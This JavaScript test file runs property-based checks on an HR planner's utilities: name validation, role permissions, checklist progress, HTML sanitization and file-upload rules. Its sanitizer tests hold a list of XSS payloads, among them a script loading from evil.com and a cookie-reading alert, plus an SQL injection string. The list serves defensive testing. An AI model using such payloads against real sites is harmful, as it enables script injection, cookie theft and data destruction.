/**
 * Property-based tests for HR Planner Workspace utilities
 * Uses fast-check with 100 iterations per property
 *
 * **Validates: Requirements Design — Testing Strategy, Properties 1, 3, 4, 5, 6, 7**
 */

import fc from 'fast-check';
import { jest } from '@jest/globals';
import { validatePlanName } from '../../utils/plannerValidation.js';
import { calculateChecklistProgress } from '../../utils/progressCalculator.js';
import { sanitizeHtml } from '../../utils/htmlSanitizer.js';
import storageService from '../../services/storageService.js';
import { checkAssignmentPermission } from '../../services/plannerService.js';

// ─── Property 1: Plan Name Boundary Validation ───────────────────────────────
// Validates: Requirements Design — Correctness Property 1

describe('Property 1 - Plan name boundary validation', () => {
  test('validatePlanName returns true iff trimmed length is 1–100', () => {
    fc.assert(
      fc.property(fc.string({ minLength: 0, maxLength: 200 }), (s) => {
        const trimmedLen = s.trim().length;
        const expected = trimmedLen >= 1 && trimmedLen <= 100;
        return validatePlanName(s) === expected;
      }),
      { numRuns: 100 }
    );
  });
});

// ─── Property 3: Role-Based Assignment Restrictions ─────────────────────────
// Validates: Requirements Design — Correctness Property 3

/**
 * Creates a mock db that returns the given user row for any query.
 */
const makeDb = (userRow) => ({
  query: jest.fn(() => Promise.resolve(userRow ? [userRow] : [])),
});

describe('Property 3 - Role-based assignment restrictions', () => {
  test('Admin assigner with any active user → always allowed', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.integer({ min: 1, max: 1000 }),
        fc.constantFrom('Admin', 'Recruiter', 'HR Intern'),
        async (targetId, targetRole) => {
          const assigner = { id: 999, role: 'Admin' };
          const targetUser = { id: targetId, role: targetRole, status: 'Active' };
          const mockDb = makeDb(targetUser);
          const result = await checkAssignmentPermission(assigner, targetId, mockDb);
          return result.allowed === true;
        }
      ),
      { numRuns: 100 }
    );
  });

  test('Recruiter assigning to self → always allowed', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.integer({ min: 1, max: 1000 }),
        async (userId) => {
          const assigner = { id: userId, role: 'Recruiter' };
          const targetUser = { id: userId, role: 'Recruiter', status: 'Active' };
          const mockDb = makeDb(targetUser);
          const result = await checkAssignmentPermission(assigner, userId, mockDb);
          return result.allowed === true;
        }
      ),
      { numRuns: 100 }
    );
  });

  test('Recruiter assigning to active HR Intern → always allowed', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.integer({ min: 1, max: 500 }),
        fc.integer({ min: 501, max: 1000 }),
        async (recruiterId, internId) => {
          const assigner = { id: recruiterId, role: 'Recruiter' };
          const targetUser = { id: internId, role: 'HR Intern', status: 'Active' };
          const mockDb = makeDb(targetUser);
          const result = await checkAssignmentPermission(assigner, internId, mockDb);
          return result.allowed === true;
        }
      ),
      { numRuns: 100 }
    );
  });

  test('Recruiter assigning to Admin → always denied', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.integer({ min: 1, max: 500 }),
        fc.integer({ min: 501, max: 1000 }),
        async (recruiterId, adminId) => {
          const assigner = { id: recruiterId, role: 'Recruiter' };
          const targetUser = { id: adminId, role: 'Admin', status: 'Active' };
          const mockDb = makeDb(targetUser);
          const result = await checkAssignmentPermission(assigner, adminId, mockDb);
          return result.allowed === false;
        }
      ),
      { numRuns: 100 }
    );
  });

  test('HR Intern assigning to self → always allowed', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.integer({ min: 1, max: 1000 }),
        async (userId) => {
          const assigner = { id: userId, role: 'HR Intern' };
          const targetUser = { id: userId, role: 'HR Intern', status: 'Active' };
          const mockDb = makeDb(targetUser);
          const result = await checkAssignmentPermission(assigner, userId, mockDb);
          return result.allowed === true;
        }
      ),
      { numRuns: 100 }
    );
  });

  test('HR Intern assigning to anyone else → always denied', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.integer({ min: 1, max: 500 }),
        fc.integer({ min: 501, max: 1000 }),
        fc.constantFrom('Admin', 'Recruiter', 'HR Intern'),
        async (internId, otherId, otherRole) => {
          const assigner = { id: internId, role: 'HR Intern' };
          const targetUser = { id: otherId, role: otherRole, status: 'Active' };
          const mockDb = makeDb(targetUser);
          const result = await checkAssignmentPermission(assigner, otherId, mockDb);
          return result.allowed === false;
        }
      ),
      { numRuns: 100 }
    );
  });
});

// ─── Property 4: Active User Validation ─────────────────────────────────────
// Validates: Requirements Design — Correctness Property 4

describe('Property 4 - Inactive user validation', () => {
  test('assignment to inactive user always returns { allowed: false }', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.integer({ min: 1, max: 1000 }),
        fc.constantFrom('Admin', 'Recruiter', 'HR Intern'),
        fc.constantFrom('Admin', 'Recruiter', 'HR Intern'),
        async (targetId, assignerRole, targetRole) => {
          const assigner = { id: 999, role: assignerRole };
          const inactiveUser = { id: targetId, role: targetRole, status: 'Inactive' };
          const mockDb = makeDb(inactiveUser);
          const result = await checkAssignmentPermission(assigner, targetId, mockDb);
          return result.allowed === false;
        }
      ),
      { numRuns: 100 }
    );
  });

  test('assignment to non-existent user always returns { allowed: false }', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.constantFrom('Admin', 'Recruiter', 'HR Intern'),
        async (assignerRole) => {
          const assigner = { id: 999, role: assignerRole };
          const mockDb = makeDb(null); // empty result — user not found
          const result = await checkAssignmentPermission(assigner, 9999, mockDb);
          return result.allowed === false;
        }
      ),
      { numRuns: 100 }
    );
  });
});

// ─── Property 5: Checklist Progress Correctness ──────────────────────────────
// Validates: Requirements Design — Correctness Property 5

describe('Property 5 - Checklist progress percentage correctness', () => {
  test('calculateChecklistProgress always returns floor(checked/total*100) or 0 for empty', () => {
    fc.assert(
      fc.property(
        fc.array(fc.boolean(), { minLength: 0, maxLength: 50 }),
        (states) => {
          const items = states.map((is_checked, id) => ({ id, is_checked }));
          const progress = calculateChecklistProgress(items);
          if (items.length === 0) {
            return progress === 0;
          }
          const checkedCount = items.filter((i) => i.is_checked).length;
          const expected = Math.floor((checkedCount / items.length) * 100);
          return progress === expected;
        }
      ),
      { numRuns: 100 }
    );
  });

  test('progress is always in the range [0, 100]', () => {
    fc.assert(
      fc.property(
        fc.array(fc.boolean(), { minLength: 0, maxLength: 50 }),
        (states) => {
          const items = states.map((is_checked, id) => ({ id, is_checked }));
          const progress = calculateChecklistProgress(items);
          return progress >= 0 && progress <= 100;
        }
      ),
      { numRuns: 100 }
    );
  });
});

// ─── Property 6: XSS Sanitization ───────────────────────────────────────────
// Validates: Requirements Design — Correctness Property 6

/** Known XSS payload patterns */
const xssPayloads = [
  '<script>alert("xss")</script>',
  '<img src="x" onerror="alert(1)">',
  '<a href="javascript:alert(1)">click</a>',
  '<body onload="alert(1)">',
  '<svg onload="alert(1)">',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<script src="https://evil.com/xss.js"></script>',
  '"><script>alert(document.cookie)</script>',
  "'; DROP TABLE users; --",
  '<img src=x onerror=alert(1)>',
];

describe('Property 6 - XSS sanitization', () => {
  test('sanitized output never contains <script from any known XSS payload', () => {
    fc.assert(
      fc.property(fc.constantFrom(...xssPayloads), (payload) => {
        const result = sanitizeHtml(payload);
        return !result.toLowerCase().includes('<script');
      }),
      { numRuns: 100 }
    );
  });

  test('sanitized output never contains onerror= from any known XSS payload', () => {
    fc.assert(
      fc.property(fc.constantFrom(...xssPayloads), (payload) => {
        const result = sanitizeHtml(payload);
        return !result.toLowerCase().includes('onerror=');
      }),
      { numRuns: 100 }
    );
  });

  test('sanitized output never contains javascript: from any known XSS payload', () => {
    fc.assert(
      fc.property(fc.constantFrom(...xssPayloads), (payload) => {
        const result = sanitizeHtml(payload);
        return !result.toLowerCase().includes('javascript:');
      }),
      { numRuns: 100 }
    );
  });

  test('sanitized output never contains onload= from any known XSS payload', () => {
    fc.assert(
      fc.property(fc.constantFrom(...xssPayloads), (payload) => {
        const result = sanitizeHtml(payload);
        return !result.toLowerCase().includes('onload=');
      }),
      { numRuns: 100 }
    );
  });

  test('sanitizeHtml strips all four XSS patterns across arbitrary wrapped payloads', () => {
    fc.assert(
      fc.property(
        fc.constantFrom(...xssPayloads),
        fc.string({ minLength: 0, maxLength: 20 }),
        (payload, wrapper) => {
          const input = `<p>${wrapper}</p>${payload}<p>${wrapper}</p>`;
          const result = sanitizeHtml(input).toLowerCase();
          return (
            !result.includes('<script') &&
            !result.includes('onerror=') &&
            !result.includes('javascript:') &&
            !result.includes('onload=')
          );
        }
      ),
      { numRuns: 100 }
    );
  });
});

// ─── Property 7: File Upload Type Validation ─────────────────────────────────
// Validates: Requirements Design — Correctness Property 7

/** Valid extension/MIME pairs from storageService ALLOWED_FILE_TYPES */
const validPairs = [
  ['image.png', 'image/png'],
  ['photo.jpg', 'image/jpeg'],
  ['photo.jpeg', 'image/jpeg'],
  ['picture.webp', 'image/webp'],
  ['document.pdf', 'application/pdf'],
  ['file.doc', 'application/msword'],
  ['file.docx', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'],
  ['sheet.xls', 'application/vnd.ms-excel'],
  ['sheet.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'],
  ['data.csv', 'text/csv'],
  ['notes.txt', 'text/plain'],
  ['archive.zip', 'application/zip'],
  ['slides.ppt', 'application/vnd.ms-powerpoint'],
  ['slides.pptx', 'application/vnd.openxmlformats-officedocument.presentationml.presentation'],
];

/** Invalid/disallowed pairs */
const invalidPairs = [
  ['script.php', 'application/x-php'],
  ['program.exe', 'application/x-msdownload'],
  ['virus.bat', 'application/x-bat'],
  ['hack.sh', 'application/x-sh'],
  ['malware.js', 'application/javascript'],
];

/** Mismatched valid extension vs wrong MIME */
const mismatchedPairs = [
  ['image.pdf', 'image/png'],     // .pdf doesn't belong to image/png
  ['photo.pdf', 'image/jpeg'],    // .pdf doesn't belong to image/jpeg
  ['doc.png', 'application/pdf'], // .png doesn't belong to application/pdf
];

describe('Property 7 - File upload type validation', () => {
  test('all valid MIME+extension pairs always return { valid: true }', () => {
    fc.assert(
      fc.property(fc.constantFrom(...validPairs), ([filename, mime]) => {
        const result = storageService.validateFileUpload(filename, mime);
        return result.valid === true;
      }),
      { numRuns: 100 }
    );
  });

  test('all disallowed MIME types always return { valid: false }', () => {
    fc.assert(
      fc.property(fc.constantFrom(...invalidPairs), ([filename, mime]) => {
        const result = storageService.validateFileUpload(filename, mime);
        return result.valid === false;
      }),
      { numRuns: 100 }
    );
  });

  test('mismatched extension/MIME pairs always return { valid: false }', () => {
    fc.assert(
      fc.property(fc.constantFrom(...mismatchedPairs), ([filename, mime]) => {
        const result = storageService.validateFileUpload(filename, mime);
        return result.valid === false;
      }),
      { numRuns: 100 }
    );
  });

  test('files without extension always return { valid: false }', () => {
    fc.assert(
      fc.property(
        fc.stringMatching(/^[a-zA-Z0-9_-]{1,20}$/), // no dots = no extension
        fc.constantFrom(...validPairs.map(([, mime]) => mime)),
        (basename, mime) => {
          const result = storageService.validateFileUpload(basename, mime);
          return result.valid === false;
        }
      ),
      { numRuns: 100 }
    );
  });
});
